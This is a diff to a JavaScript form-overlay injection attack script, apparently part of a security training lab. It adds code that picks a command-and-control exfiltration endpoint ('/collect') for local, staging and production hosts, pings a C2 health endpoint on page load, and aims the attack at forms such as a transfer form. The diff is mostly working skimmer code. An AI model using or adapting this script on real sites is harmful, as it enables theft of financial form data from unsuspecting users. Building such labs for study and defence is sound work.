@@ -22,8 +22,58 @@
   console.log('[Form-Overlay] Initializing form overlay injection attack...')
 
   // Attack configuration
+  // Dynamically determine C2 URL based on environment
+  const hostname = window.location.hostname
+  let exfilUrl = 'http://localhost:9004/collect' // Local development default
+  let healthUrl = 'http://localhost:9004/health' // Local development default
+
+  // Production and staging - use relative URL since C2 is proxied by nginx
+  if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
+    exfilUrl = window.location.origin + '/collect'
+    healthUrl = window.location.origin + '/health'
+  }
+
+  /**
+   * Health Check - Ping C2 server on page load to ensure it's ready
+   * This prevents data loss during server startup
+   */
+  async function checkC2Health() {
+    try {
+      const response = await fetch(healthUrl, {
+        method: 'GET',
+        mode: 'cors',
+        credentials: 'omit',
+        cache: 'no-cache'
+      })
+      
+      if (response.ok) {
+        const data = await response.json()
+        console.log('[Form-Overlay] ✅ C2 server is ready:', data)
+        return true
+      } else {
+        console.warn('[Form-Overlay] ⚠️ C2 server health check failed with status:', response.status)
+        return false
+      }
+    } catch (error) {
+      console.warn('[Form-Overlay] ⚠️ C2 server health check failed:', error.message)
+      // Retry after a short delay
+      setTimeout(() => {
+        checkC2Health().then(ready => {
+          if (ready) {
+            console.log('[Form-Overlay] ✅ C2 server is now ready after retry')
+          }
+        })
+      }, 2000)
+      return false
+    }
+  }
+
+  // Perform health check immediately on page load
+  checkC2Health()
+
   const CONFIG = {
-    exfilUrl: 'http://localhost:9004/collect',
+    exfilUrl: exfilUrl,
+    healthUrl: healthUrl,
     debug: true,
     targetForms: [
       '#transfer-form',
